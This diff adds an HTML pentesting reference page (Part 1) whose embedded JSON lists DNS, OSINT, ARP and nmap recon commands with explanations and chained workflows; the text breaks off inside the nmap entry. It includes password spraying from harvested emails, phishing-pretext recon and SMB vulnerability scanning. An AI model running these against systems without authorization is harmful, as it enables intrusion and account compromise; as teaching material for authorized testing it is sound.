@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Master Tools Collection for Pentesting — Part 1</title>
+<style>
+  :root{
+    --bg:#0a0e0e;
+    --bg-alt:#0d1315;
+    --panel:#101817;
+    --panel-2:#0d1517;
+    --border:#1c2b28;
+    --border-soft:#162220;
+    --text:#d7e8e2;
+    --text-dim:#7fa79b;
+    --text-dimmer:#547067;
+    --green:#3ef29c;
+    --green-dim:#2a9e6c;
+    --cyan:#52d6e8;
+    --amber:#f3c15f;
+    --red:#ff6b6b;
+    --mono: 'JetBrains Mono', 'Fira Code', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    background:var(--bg);
+    color:var(--text);
+    font-family:var(--mono);
+    font-size:14.5px;
+    line-height:1.6;
+    -webkit-font-smoothing:antialiased;
+  }
+  ::selection{background:var(--green-dim);color:#04120b;}
+  a{color:var(--cyan);text-decoration:none;}
+  a:hover{text-decoration:underline;}
+
+  /* Scrollbar */
+  ::-webkit-scrollbar{width:9px;height:9px;}
+  ::-webkit-scrollbar-track{background:var(--bg);}
+  ::-webkit-scrollbar-thumb{background:var(--border);border-radius:6px;}
+  ::-webkit-scrollbar-thumb:hover{background:var(--green-dim);}
+
+  .layout{display:flex;min-height:100vh;}
+
+  /* SIDEBAR */
+  .sidebar{
+    width:290px;
+    flex-shrink:0;
+    background:var(--bg-alt);
+    border-right:1px solid var(--border);
+    position:sticky;
+    top:0;
+    height:100vh;
+    overflow-y:auto;
+    padding:0 0 24px 0;
+  }
+  .sidebar-head{
+    padding:22px 18px 16px 18px;
+    border-bottom:1px solid var(--border);
+    position:sticky;
+    top:0;
+    background:var(--bg-alt);
+    z-index:5;
+  }
+  .brand{
+    font-size:11px;
+    letter-spacing:2px;
+    color:var(--green);
+    text-transform:uppercase;
+    margin:0 0 4px 0;
+    font-weight:700;
+  }
+  .brand-sub{
+    font-size:11px;
+    color:var(--text-dimmer);
+    margin:0 0 12px 0;
+  }
+  .search-box{
+    width:100%;
+    background:var(--panel);
+    border:1px solid var(--border);
+    color:var(--text);
+    font-family:var(--mono);
+    font-size:12.5px;
+    padding:8px 10px;
+    border-radius:5px;
+    outline:none;
+  }
+  .search-box:focus{border-color:var(--green-dim);}
+  .search-box::placeholder{color:var(--text-dimmer);}
+
+  .nav-group-label{
+    font-size:10px;
+    letter-spacing:1.5px;
+    text-transform:uppercase;
+    color:var(--text-dimmer);
+    padding:16px 18px 6px 18px;
+  }
+  .nav-item{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    padding:7px 18px;
+    color:var(--text-dim);
+    font-size:12.8px;
+    cursor:pointer;
+    border-left:2px solid transparent;
+    transition:background .12s, color .12s, border-color .12s;
+  }
+  .nav-item:hover{background:var(--panel);color:var(--text);text-decoration:none;}
+  .nav-item.active{
+    color:var(--green);
+    border-left-color:var(--green);
+    background:var(--panel);
+  }
+  .nav-num{color:var(--text-dimmer);font-size:11px;min-width:16px;}
+  .nav-item.active .nav-num{color:var(--green-dim);}
+
+  /* MAIN */
+  .main{flex:1;min-width:0;padding:0 0 100px 0;}
+  .hero{
+    padding:56px 56px 34px 56px;
+    border-bottom:1px solid var(--border);
+    background:
+      radial-gradient(600px 300px at 85% -10%, rgba(62,242,156,.07), transparent 60%),
+      radial-gradient(500px 260px at 10% -20%, rgba(82,214,232,.06), transparent 60%);
+  }
+  .hero-eyebrow{
+    color:var(--amber);
+    font-size:12px;
+    letter-spacing:3px;
+    text-transform:uppercase;
+    margin:0 0 14px 0;
+    font-weight:700;
+  }
+  .hero h1{
+    margin:0 0 14px 0;
+    font-size:34px;
+    line-height:1.25;
+    color:var(--text);
+    font-weight:700;
+    letter-spacing:-.5px;
+  }
+  .hero h1 span{color:var(--green);}
+  .hero p{
+    max-width:760px;
+    color:var(--text-dim);
+    font-size:14px;
+    margin:0 0 20px 0;
+  }
+  .hero-stats{display:flex;gap:28px;flex-wrap:wrap;margin-top:22px;}
+  .stat{border-left:2px solid var(--border);padding-left:12px;}
+  .stat b{display:block;color:var(--cyan);font-size:20px;}
+  .stat span{color:var(--text-dimmer);font-size:11px;letter-spacing:.5px;text-transform:uppercase;}
+
+  .content{padding:40px 56px;}
+
+  section.tool{
+    margin-bottom:74px;
+    scroll-margin-top:20px;
+  }
+  .tool-head{
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    gap:20px;
+    flex-wrap:wrap;
+    border-bottom:1px solid var(--border);
+    padding-bottom:18px;
+    margin-bottom:22px;
+  }
+  .tool-title-wrap{display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;}
+  .tool-title{
+    font-size:26px;
+    color:var(--text);
+    font-weight:700;
+    margin:0;
+  }
+  .tool-title .tag{color:var(--green);}
+  .tool-tagline{color:var(--text-dim);font-size:13.5px;margin-top:6px;max-width:680px;}
+  .badge-row{display:flex;gap:8px;flex-wrap:wrap;}
+  .badge{
+    font-size:10.5px;
+    letter-spacing:.5px;
+    text-transform:uppercase;
+    padding:4px 9px;
+    border-radius:20px;
+    border:1px solid var(--border);
+    color:var(--text-dim);
+    white-space:nowrap;
+  }
+  .badge.cat{border-color:var(--green-dim);color:var(--green);}
+  .badge.verified{border-color:var(--cyan);color:var(--cyan);}
+
+  .callout{
+    border:1px solid var(--border);
+    border-left:3px solid var(--amber);
+    background:var(--panel);
+    padding:14px 16px;
+    border-radius:6px;
+    margin:0 0 22px 0;
+    font-size:12.8px;
+    color:var(--text-dim);
+  }
+  .callout b{color:var(--amber);}
+  .callout.info{border-left-color:var(--cyan);}
+  .callout.info b{color:var(--cyan);}
+
+  h3.sub{
+    font-size:13px;
+    text-transform:uppercase;
+    letter-spacing:1.5px;
+    color:var(--text-dimmer);
+    margin:32px 0 14px 0;
+    display:flex;
+    align-items:center;
+    gap:10px;
+  }
+  h3.sub::after{content:'';flex:1;height:1px;background:var(--border);}
+
+  .cmd-block{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    margin-bottom:16px;
+    overflow:hidden;
+  }
+  .cmd-label{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:10px 14px;
+    background:var(--panel-2);
+    border-bottom:1px solid var(--border-soft);
+    font-size:12.5px;
+    color:var(--text);
+    font-weight:600;
+  }
+  .copy-btn{
+    background:transparent;
+    border:1px solid var(--border);
+    color:var(--text-dimmer);
+    font-family:var(--mono);
+    font-size:10.5px;
+    padding:3px 9px;
+    border-radius:4px;
+    cursor:pointer;
+    transition:.15s;
+    letter-spacing:.5px;
+  }
+  .copy-btn:hover{border-color:var(--green-dim);color:var(--green);}
+  .copy-btn.copied{border-color:var(--green);color:var(--green);}
+  pre{
+    margin:0;
+    padding:14px 16px;
+    overflow-x:auto;
+    font-size:12.8px;
+    color:var(--green);
+    line-height:1.65;
+  }
+  pre code{font-family:var(--mono);}
+  .cmt{color:var(--text-dimmer);}
+  .flag{color:var(--amber);}
+  .str{color:var(--cyan);}
+
+  .meta-grid{
+    display:grid;
+    grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+    gap:0;
+    border-top:1px solid var(--border-soft);
+  }
+  .meta-item{
+    padding:11px 16px;
+    border-right:1px solid var(--border-soft);
+    border-bottom:1px solid var(--border-soft);
+  }
+  .meta-item:last-child{border-right:none;}
+  .meta-item .k{
+    font-size:10px;
+    text-transform:uppercase;
+    letter-spacing:1px;
+    color:var(--text-dimmer);
+    margin-bottom:4px;
+  }
+  .meta-item .v{font-size:12.3px;color:var(--text-dim);}
+  .meta-item.why .k{color:var(--green-dim);}
+  .meta-item.look .k{color:var(--cyan);}
+  .meta-item.next .k{color:var(--amber);}
+  .meta-item.err .k{color:var(--red);}
+
+  .combo-card{
+    background:linear-gradient(180deg, rgba(62,242,156,.04), transparent 40%), var(--panel);
+    border:1px solid var(--border);
+    border-radius:8px;
+    padding:18px 18px 8px 18px;
+    margin-bottom:18px;
+  }
+  .combo-title{
+    font-size:14px;
+    color:var(--cyan);
+    font-weight:700;
+    margin:0 0 6px 0;
+    display:flex;
+    align-items:center;
+    gap:8px;
+  }
+  .combo-title .n{
+    font-size:10px;
+    background:var(--green-dim);
+    color:#04120b;
+    padding:2px 7px;
+    border-radius:10px;
+    font-weight:700;
+  }
+  .combo-explain{color:var(--text-dim);font-size:12.6px;margin-bottom:12px;}
+  .combo-explain b{color:var(--text);}
+
+  table.opts{width:100%;border-collapse:collapse;margin-bottom:10px;font-size:12.4px;}
+  table.opts th{
+    text-align:left;
+    color:var(--text-dimmer);
+    text-transform:uppercase;
+    font-size:10.5px;
+    letter-spacing:1px;
+    padding:8px 10px;
+    border-bottom:1px solid var(--border);
+  }
+  table.opts td{
+    padding:8px 10px;
+    border-bottom:1px solid var(--border-soft);
+    color:var(--text-dim);
+    vertical-align:top;
+  }
+  table.opts td.flagcell{color:var(--amber);white-space:nowrap;font-weight:600;}
+
+  .overview{color:var(--text-dim);font-size:13.4px;margin-bottom:6px;max-width:820px;}
+
+  .footer-note{
+    margin-top:60px;
+    padding:24px 56px;
+    border-top:1px solid var(--border);
+    color:var(--text-dimmer);
+    font-size:11.5px;
+    text-align:center;
+  }
+
+  .top-bar{
+    display:none;
+  }
+  @media (max-width:900px){
+    .sidebar{
+      position:fixed;
+      left:-300px;
+      z-index:50;
+      transition:left .2s;
+      box-shadow:10px 0 40px rgba(0,0,0,.5);
+    }
+    .sidebar.open{left:0;}
+    .top-bar{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      padding:14px 18px;
+      background:var(--bg-alt);
+      border-bottom:1px solid var(--border);
+      position:sticky;
+      top:0;
+      z-index:10;
+    }
+    .top-bar button{
+      background:var(--panel);
+      border:1px solid var(--border);
+      color:var(--green);
+      font-family:var(--mono);
+      padding:6px 12px;
+      border-radius:5px;
+    }
+    .hero{padding:30px 20px;}
+    .content{padding:24px 20px;}
+    .hero h1{font-size:24px;}
+  }
+</style>
+</head>
+<body>
+
+<div class="top-bar">
+  <span style="color:var(--green);font-weight:700;font-size:12px;letter-spacing:1px;">MASTER TOOLS · PT 1</span>
+  <button onclick="document.querySelector('.sidebar').classList.toggle('open')">☰ MENU</button>
+</div>
+
+<div class="layout">
+  <nav class="sidebar">
+    <div class="sidebar-head">
+      <div class="brand">Master Tools Collection</div>
+      <div class="brand-sub">Part 1 of N · Pentesting Reference</div>
+      <input class="search-box" id="navSearch" placeholder="Filter tools... (e.g. kerberos, smb)" oninput="filterNav()">
+    </div>
+    <div id="navList"></div>
+  </nav>
+
+  <main class="main">
+    <div class="hero">
+      <div class="hero-eyebrow">cyberfox.in field reference · dark terminal edition</div>
+      <h1>Master Tools Collection for Pentesting <span>— Part 1</span></h1>
+      <p>A single-file, offline-first reference covering 20 core tools spanning OSINT, network discovery, SMB/AD enumeration,
+      credential attacks, exploitation, and Windows/Linux privilege escalation. Every command has been fact-checked against
+      current tool behavior (2026), with corrections flagged inline, plus real-world tool-chaining combos showing how working
+      pentesters actually sequence these commands on an engagement — not just the flag, but the reasoning behind it.</p>
+      <div class="hero-stats">
+        <div class="stat"><b>20</b><span>Tools Covered</span></div>
+        <div class="stat"><b>90+</b><span>Verified Commands</span></div>
+        <div class="stat"><b>60+</b><span>Field Combo Workflows</span></div>
+        <div class="stat"><b>100%</b><span>Offline / Single File</span></div>
+      </div>
+    </div>
+
+    <div class="content" id="content"></div>
+
+    <div class="footer-note">
+      Built for lab, CTF, and authorized engagement use only. Always operate within written scope and rules of engagement.
+      Part of the cyberfox.in reference series — see Part 2 for web app, cloud, and container-focused tooling.
+    </div>
+  </main>
+</div>
+
+<script id="toolData" type="application/json">
+[{"id": "recon-toolkit", "cat": "Recon & OSINT", "name": "DNS Recon Toolkit (dig / dnsrecon)", "tagline": "Low-level DNS interrogation and zone-transfer / zone-walk testing.", "overview": "Before touching a single port, pull everything the DNS system will give up for free. <code>dig</code> is the raw query tool; <code>dnsrecon</code> automates brute-forcing and DNSSEC-specific attacks like zone walking. This is almost always the very first command run on any external engagement.", "note": "The original ANY query example is correct but worth flagging: most authoritative resolvers (and virtually all major public DNS providers) now refuse or heavily rate-limit <code>ANY</code> queries per RFC 8482, so expect a REFUSED or a minimal response on modern infrastructure \u2014 it is not a sign the domain doesn't exist. Query specific record types instead for reliable results.", "info": null, "commands": [{"label": "Get every record type in one query", "code": "dig example.com ANY", "why": "Fast overview of what DNS infrastructure exists for a domain.", "look": "A, MX, TXT, NS records returned in a single response.", "next": "Pivot to targeted A/MX/TXT/NS queries since ANY is frequently blocked.", "err": "REFUSED or empty response \u2014 the resolver is filtering ANY per RFC 8482; query record types individually."}, {"label": "Attempt a zone transfer (AXFR)", "code": "dig axfr @<dns_server> example.com", "why": "A misconfigured secondary/primary DNS relationship can leak the entire internal zone file in one request.", "look": "A full list of every host record in the zone \u2014 internal hostnames, dev/staging boxes, service records.", "next": "This is a reportable finding by itself; map every hostname found onto your scope for further recon.", "err": "Transfer refused \u2014 expected on hardened setups; note it and move on to brute-forcing."}, {"label": "Brute-force subdomains with a wordlist", "code": "dnsrecon -d example.com -D /usr/share/wordlists/dnsmap.txt -t brt", "why": "Uncovers subdomains that are never indexed publicly (internal panels, dev/staging environments).", "look": "Resolved subdomain + IP pairs printed to stdout.", "next": "Feed every new subdomain into nmap / httpx for live-host and web-service triage.", "err": "No hits \u2014 try SecLists' dns/subdomains-top1million-5000.txt for broader coverage."}, {"label": "DNSSEC zone walk", "code": "dnsrecon -d example.com -t zonewalk", "why": "On zones using NSEC (not NSEC3) records, DNSSEC's own 'proof of non-existence' mechanism can be walked to enumerate the entire zone without a real transfer.", "look": "A full enumerated list of hostnames, equivalent to a leaked zone transfer.", "next": "Treat exactly like a successful AXFR \u2014 map hosts and report the misconfiguration.", "err": "Zone uses NSEC3 (hashed) or DNSSEC isn't enabled \u2014 zone walking fails by design."}], "options": [["-t brt", "dnsrecon: brute-force subdomains from a wordlist"], ["-t zonewalk", "dnsrecon: attempt a DNSSEC NSEC zone walk"], ["+dnssec", "dig: request DNSSEC records / validation flags"], ["@<server>", "dig: query a specific nameserver instead of the system resolver"]], "combos": [{"title": "Full passive-to-active DNS pivot", "explain": "The standard opening move: pull every record type, then try the transfer, then brute-force what's left, and immediately hand every discovered host to nmap for a first-pass port scan \u2014 all before any manual browsing begins.", "code": "dig example.com NS\ndig example.com MX\ndig axfr @ns1.example.com example.com\ndnsrecon -d example.com -D /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t brt\ncat subdomains.txt | while read h; do nmap -sS -T4 --top-ports 100 -oG - $h; done"}, {"title": "Wildcard-DNS sanity check before brute-forcing", "explain": "Many domains wildcard *.example.com to a parking page, which makes brute-force output look like a false positive flood of hits. Pros always query a deliberately-random subdomain first to detect this before trusting brute-force results.", "code": "dig totally-random-doesnotexist-9f8x.example.com\n# if this resolves, the domain has a wildcard -- filter dnsrecon output against that IP\ndnsrecon -d example.com -D wordlist.txt -t brt | grep -v <wildcard_ip>"}]}, {"id": "theharvester", "cat": "Recon & OSINT", "name": "theHarvester", "tagline": "Passive OSINT harvesting of emails, subdomains, hosts, and employee names.", "overview": "theHarvester aggregates results from search engines, certificate transparency logs, and paid APIs into one report. It is the tool of choice for building an initial attack-surface map and an email-format baseline for later password-spraying or phishing pretexts.", "note": "Several sources listed in the original file (shodan, censys, securitytrails, virustotal) require a valid, configured API key in <code>api-keys.yaml</code> or they silently return nothing \u2014 theHarvester will not error loudly, it just skips the source. Also, <code>-b all</code> in current versions (theHarvester 4.x) queries only the sources that have keys configured plus the free ones; it does not guarantee comprehensive coverage the way it implied in earlier 3.x releases. Always check which sources actually returned data in the summary at the end of the run.", "info": "crt.sh (Certificate Transparency) is consistently the highest-yield free source in 2026 since every publicly trusted TLS cert is logged \u2014 prioritize <code>-b crtsh</code> if you only have time for one source.", "commands": [{"label": "Comprehensive gather across all sources", "code": "theHarvester -d example.com -b all", "why": "Casts the widest net across every configured OSINT source in one pass.", "look": "Email addresses for spraying, subdomains for further enumeration, and named employees for pretexting.", "next": "Feed emails into a spray tool (with rate-limiting/lockout awareness) and subdomains into nmap.", "err": "Low yield usually means the domain has small public footprint or free-tier sources are rate-limited \u2014 try crt.sh alone."}, {"label": "Single free, high-yield source", "code": "theHarvester -d example.com -b crtsh", "why": "Certificate Transparency logs are free, unauthenticated, and capture nearly every subdomain that has ever had a cert issued.", "look": "A long list of historical and current subdomains, including decommissioned ones.", "next": "Cross-reference stale entries against current DNS resolution to separate live from dead hosts.", "err": "No results \u2014 domain may use a wildcard cert or an internal CA not logged publicly."}, {"label": "DNS brute force pass", "code": "theHarvester -d example.com --dns-brute", "why": "Adds active brute-forcing to catch subdomains that never appear in search engines or CT logs.", "look": "Newly resolved hostnames not seen from passive sources.", "next": "Merge with passive results and de-duplicate before the scanning phase.", "err": "No hits \u2014 the built-in wordlist is small; supplement with dnsrecon and a larger wordlist."}, {"label": "Full report with API-backed sources", "code": "theHarvester -d example.com -b all -l 500 -f report.html", "why": "Increases the result cap and produces a shareable HTML artifact for the engagement report appendix.", "look": "report.html containing consolidated emails, hosts, and IPs.", "next": "Attach to the recon section of the final report; use emails for a scoped spray list.", "err": "Empty report sections indicate those specific sources returned nothing \u2014 check api-keys.yaml."}], "options": [["-b <source>", "Data source(s): google, bing, crtsh, dnsdumpster, all, etc."], ["-l <n>", "Limit number of results per source"], ["-f <file>", "Save output to HTML/XML/JSON"], ["--dns-brute", "Active subdomain brute force"], ["--screenshot", "Take screenshots of discovered web hosts (requires additional setup)"]], "combos": [{"title": "OSINT-to-spray pipeline", "explain": "theHarvester establishes the company email naming convention (first.last@, flast@, etc.) from a handful of confirmed employee names, which lets you generate a full spray list from a LinkedIn employee scrape without ever guessing formats blind.", "code": "theHarvester -d example.com -b crtsh,linkedin -f harvest.json\n# derive naming pattern from harvest.json, e.g. first.last@example.com\n# generate candidate list, then spray with strict lockout-aware throttling\nkerbrute passwordspray -d example.com --dc dc01.example.com userlist.txt \"Summer2026!\""}, {"title": "Cross-tool subdomain reconciliation", "explain": "Running theHarvester and Sublist3r in parallel and diffing the outputs catches sources each tool misses individually \u2014 professionals rarely trust a single subdomain enumerator alone.", "code": "theHarvester -d example.com -b all -f th.json\nsublist3r -d example.com -o sub3.txt\njq -r \".hosts[]\" th.json > th_hosts.txt\ncat th_hosts.txt sub3.txt | sort -u > all_subs.txt"}]}, {"id": "sublist3r", "cat": "Recon & OSINT", "name": "Sublist3r", "tagline": "Fast passive + brute-force subdomain enumeration via search engines.", "overview": "Sublist3r is lightweight and fast, aggregating Google, Bing, Yahoo, Baidu, and other engines' indexed results, with an optional brute-force module. It's commonly run as a quick first pass before a heavier tool like dnsrecon or Amass.", "note": "Several of the underlying search-engine scraping modules (Yahoo, Baidu, AskExample) have become unreliable over time as those engines have tightened anti-scraping measures, so real-world yield is now weighted heavily toward Google/Bing and the built-in VirusTotal/crt.sh-style sources rather than evenly across '-e google,bing,yahoo' as the flag might suggest. Treat multi-engine flags as best-effort, not guaranteed parallel coverage.", "info": null, "commands": [{"label": "Basic subdomain enumeration", "code": "sublist3r -d example.com", "why": "Quick passive sweep across default search engines with no active traffic to the target.", "look": "A flat list of discovered subdomains printed to stdout.", "next": "Pipe into httpx or nmap to identify which subdomains are actually alive.", "err": "Empty output usually means small public footprint \u2014 add -b for brute force."}, {"label": "Enumerate + scan for common web ports", "code": "sublist3r -d example.com -p 80,443", "why": "Immediately identifies which discovered subdomains are running a live web service.", "look": "Subdomains annotated with open port status.", "next": "Screenshot/fingerprint each live web host (e.g. with httpx -title -tech-detect or EyeWitness).", "err": "No open ports found \u2014 services may sit behind a WAF/CDN filtering direct scans; try via the CDN edge."}, {"label": "Bruteforce with increased threads", "code": "sublist3r -d example.com -b -t 20", "why": "Actively tries a wordlist of common subdomain names against the target's DNS, catching entries no search engine ever indexed.", "look": "A larger, more complete subdomain list including dev/staging/internal names.", "next": "Verify each brute-forced hit resolves to a real (non-wildcard) IP before treating it as valid.", "err": "No extra hits \u2014 increase thread count cautiously or supply a larger wordlist via source edit."}], "options": [["-b", "Enable brute-force module"], ["-t <n>", "Threads for brute-force"], ["-p <ports>", "Port-scan discovered subdomains"], ["-o <file>", "Save results to file"], ["-v", "Verbose, real-time results"]], "combos": [{"title": "Subdomain-to-attack-surface handoff", "explain": "Chaining Sublist3r straight into httpx and nuclei is the standard modern move for turning a subdomain list into a prioritized target list within minutes, rather than manually visiting each host.", "code": "sublist3r -d example.com -o subs.txt\ncat subs.txt | httpx -title -status-code -tech-detect -o live_hosts.txt\ncat live_hosts.txt | nuclei -tags exposure,misconfig -o findings.txt"}]}, {"id": "nslookup", "cat": "Recon & OSINT", "name": "nslookup", "tagline": "Cross-platform DNS query utility, often the only DNS tool present on Windows hosts.", "overview": "nslookup is deprecated in favor of dig on Linux, but it remains the default and often only DNS tool available out-of-the-box on Windows \u2014 meaning it's frequently the first thing you reach for from a foothold shell before dropping better tooling on disk.", "note": "On Windows, the modern equivalent/companion is <code>Resolve-DnsName</code> in PowerShell, which returns structured objects rather than parsed text and is generally preferred by operators once PowerShell is available; nslookup remains valuable specifically because it works from cmd.exe with zero dependencies.", "info": null, "commands": [{"label": "Basic forward lookup", "code": "nslookup example.com", "why": "Resolve a domain to its IP address using the default configured DNS server.", "look": "The Address: field(s) returned.", "next": "Use the IP for further scanning.", "err": "Non-existent domain / SERVFAIL \u2014 check spelling or try a public resolver like 8.8.8.8."}, {"label": "Query a specific record type", "code": "nslookup -type=MX example.com", "why": "Retrieve mail exchange records to map the target's email infrastructure (useful for phishing infra recon and SPF/DMARC checks).", "look": "Priority + hostname pairs for mail servers.", "next": "Check SPF/DMARC via -type=TXT to assess email spoofing exposure.", "err": "No MX records \u2014 domain may not handle mail directly (uses a subdomain or third party)."}, {"label": "Reverse DNS lookup", "code": "nslookup 10.10.10.10", "why": "Resolve an IP back to a hostname, useful for identifying internal naming conventions during internal engagements.", "look": "The PTR record / name value.", "next": "Use naming convention patterns (e.g. DC01, SQL-PROD-02) to infer other high-value hosts to target.", "err": "No PTR record configured \u2014 very common internally; not necessarily a finding."}, {"label": "Query against a specific DNS server", "code": "nslookup example.com 8.8.8.8", "why": "Bypass a possibly-poisoned or restrictive local resolver and compare answers against a trusted public resolver.", "look": "Differences between internal and external resolution \u2014 can reveal split-horizon DNS or DNS-based access control.", "next": "Map any internal-only records found via the local resolver as valuable internal recon.", "err": "Same result both ways \u2014 no split-horizon setup detected."}], "options": [["-type=A/AAAA/MX/NS/TXT/CNAME/ANY", "Record type to query"], ["-debug", "Verbose query/response detail"], ["set type=X", "Interactive-mode equivalent of -type=X"]], "combos": [{"title": "Living-off-the-land DNS recon from a foothold", "explain": "On an initial Windows foothold with no internet-facing tools yet staged, nslookup is used to map internal DNS (domain controllers, mail, naming convention) before ever touching PowerView, since it draws zero attention from AV/EDR.", "code": "nslookup -type=SRV _ldap._tcp.dc._msdcs.example.com\nnslookup -type=A dc01.example.com\nnslookup -type=MX example.com"}]}, {"id": "netdiscover", "cat": "Network Discovery", "name": "netdiscover", "tagline": "ARP-based live host discovery for local/adjacent network segments.", "overview": "netdiscover works purely at Layer 2 via ARP requests (or passive sniffing), making it effective for finding live hosts on a segment even when ICMP is filtered \u2014 something a plain ping sweep would miss entirely. It only works on networks you're directly connected to (not routed/remote).", "note": "The <code>-f</code> flag is 'fast mode', which skips the vendor MAC-OUI lookup delay rather than being a general speed toggle, and note that netdiscover only operates on the local broadcast domain \u2014 it cannot discover hosts across a router hop, so on a routed internal network you'll need it run per-VLAN/segment or fall back to an ARP-less method like an nmap ping sweep from a pivot.", "info": null, "commands": [{"label": "Default scan of local network", "code": "sudo netdiscover", "why": "Fastest way to see what's alive on your directly-connected segment before doing anything else.", "look": "IP, MAC address, and vendor for every responding host.", "next": "Cross-reference MAC vendor (e.g. VMware, Dell, Cisco) to guess device types before scanning.", "err": "No responses \u2014 you may be on an isolated VLAN or ARP is filtered by a switch ACL."}, {"label": "Targeted range on a specific interface", "code": "sudo netdiscover -i eth0 -r 192.168.1.0/24", "why": "Scope the scan to a known subnet on a specific NIC, useful when multiple interfaces/VLANs are attached.", "look": "A list of active hosts on that exact subnet.", "next": "Feed live IPs directly into nmap for service enumeration.", "err": "Empty results \u2014 confirm the interface is actually on that subnet with ip addr."}, {"label": "Passive sniffing mode", "code": "sudo netdiscover -p", "why": "Listen only, sending zero ARP requests \u2014 the stealthiest possible discovery method, useful on monitored/IDS-heavy internal networks.", "look": "Hosts that are naturally broadcasting ARP traffic on their own.", "next": "Supplement with active scanning once you've built initial situational awareness quietly.", "err": "Sparse results \u2014 passive mode only sees what's already chatty; give it more time."}], "options": [["-r <range>", "CIDR range to scan"], ["-i <iface>", "Network interface to use"], ["-p", "Passive mode (sniff only, no ARP requests sent)"], ["-f", "Fast mode (skip vendor lookup delay)"], ["-P / -L", "Parsable output, exit / continue listening"]], "combos": [{"title": "Silent-then-loud internal recon", "explain": "Start passive to build a baseline without generating any traffic that an internal SOC could alert on, then switch to active ARP scanning once you have a sense of the network's normal chatter.", "code": "sudo timeout 120 netdiscover -i eth0 -p -P > passive_hosts.txt\nsudo netdiscover -i eth0 -r 192.168.1.0/24 -P > active_hosts.txt\ndiff passive_hosts.txt active_hosts.txt"}]}, {"id": "nmap", "cat": "Network Discovery", "name": "Nmap", "tagline": "The industry-standard network scanner for host discovery, port scanning, and service/version fingerprinting.", "overview": "Nmap is the backbone of nearly every engagement's active recon phase. Beyond raw port scanning, its Nmap Scripting Engine (NSE) turns it into a lightweight vulnerability scanner capable of everything from SMB enumeration to checking for specific CVEs.", "note": "All commands in the original reference are technically correct. One addition worth flagging: <code>-A</code> (aggressive scan) is intentionally noisy and easily fingerprinted by IDS/IPS \u2014 on engagements where stealth matters, professionals build up the same information manually (-sV -sC -O separately, staggered) rather than firing -A directly. Also, on modern hardened targets ICMP is very commonly blocked, so <code>-Pn</code> (skip host discovery, assume host is up) is used constantly in real engagements even though it didn't appear in the original file.", "info": "<code>-Pn</code> (treat all hosts as online, skip discovery ping) is one of the most-used flags in real engagements and deserves a permanent place on your cheat sheet \u2014 most corporate firewalls drop ICMP by default.", "commands": [{"label": "Ping sweep for host discovery", "code": "nmap -sn $IP/24", "why": "Quickly identify which hosts in a subnet are online before running detailed scans on each.", "look": "A list of IPs reported as 'Host is up'.", "next": "Feed live hosts into a full TCP/UDP scan.", "err": "No hosts found \u2014 ICMP may be filtered; add -Pn to a targeted scan instead of relying on discovery."}, {"label": "TCP connect scan", "code": "nmap -sT $IP", "why": "Completes the full TCP three-way handshake; reliable and usable without root, but noisier and easily logged.", "look": "Open TCP ports list.", "next": "Run service/version detection on any open ports found.", "err": "Nothing open \u2014 try -p- for full 65535 port range or check firewall filtering with -Pn."}, {"label": "SYN / stealth scan", "code": "sudo nmap -sS $IP", "why": "Half-open scan \u2014 faster and quieter than a full connect scan, the default choice for most engagements. Requires raw socket privileges (root/sudo).", "look": "Open TCP ports list.", "next": "Layer -sV -sC onto interesting ports for detail.", "err": "Nothing found \u2014 try -p- for all ports, or -Pn if host discovery is being blocked."}, {"label": "UDP scan of common ports", "code": "sudo nmap -sU -p 53,161 $IP", "why": "UDP services (DNS, SNMP) are frequently misconfigured and overlooked, since UDP scanning is slow and often skipped by less careful testers.", "look": "Ports marked open or open|filtered.", "next": "Enumerate DNS/SNMP directly \u2014 SNMP with default community strings is still a very common finding.", "err": "All closed/filtered \u2014 UDP scanning is inherently slow and unreliable; increase timing or target fewer, high-value ports."}, {"label": "Service/version detection", "code": "nmap -sV $IP", "why": "Identify exact software + version behind each open port to research known CVEs.", "look": "Service banners like 'vsftpd 2.3.4' or 'OpenSSH 7.2p2'.", "next": "Cross-reference every version string against searchsploit and public CVE databases.", "err": "Version unknown \u2014 try nmap -sV --version-intensity 9 for more aggressive probing."}, {"label": "Aggressive all-in-one scan", "code": "nmap -A $IP", "why": "Convenience shortcut bundling OS detection, version detection, default scripts, and traceroute.", "look": "A comprehensive single report covering ports, services, OS guess, and script output.", "next": "Use the full picture to triage which services deserve deep-dive manual testing.", "err": "This scan is intrusive/noisy \u2014 on stealth-sensitive engagements, break it into individual flags instead."}, {"label": "Default NSE script scan", "code": "nmap -sC $IP", "why": "Runs Nmap's curated 'safe' script category automatically for extra low-risk enumeration.", "look": "Extra data like HTTP titles, SMB share names, SSL cert details.", "next": "Chase any interesting script output with a manual, targeted follow-up.", "err": "Nothing extra found \u2014 try category-specific scripts like --script vuln for deeper (but riskier) checks."}, {"label": "SMB share enumeration script", "code": "nmap -p 445 --script=smb-enum-shares $IP", "why": "Purpose-built script to list SMB shares directly from a port scan without needing a separate tool.", "look": "Share names and whether they permit anonymous access.", "next": "Connect to any readable/writable share with smbclient or smbmap.", "err": "No shares listed \u2014 anonymous SMB enumeration is likely disabled (common on hardened Windows builds since 2019+)."}, {"label": "SMB vulnerability check", "code": "nmap -p 445 --script=smb-vuln-* $IP", "why": "Checks for a bundle of known SMB CVEs (e.g. MS17-010/EternalBlue) in one pass.", "look": "A 'VULNERABLE' state explicitly printed for any matching CVE.", "next": "Confirm with a dedicated exploit check (e.g. Metasploit's ms17_010 scanner module) before firing any exploit.", "err": "Not vulnerable \u2014 target is patched against the checked CVEs specifically, not necessarily all SMB issues."}, {"label": "Anonymous FTP check", "code": "nmap -p 21 --script=ftp-anon $IP", "why": "Quickly flags FTP servers that allow anonymous login without a manual connection attempt.", "look": "'Anonymous FTP login allowed' in the output.", "next": "Connect with ftp anonymous/anonymous and check for readable/writable directories.", "err": "Not allowed \u2014 try default/weak credential guesses manually or move on."}], "options": 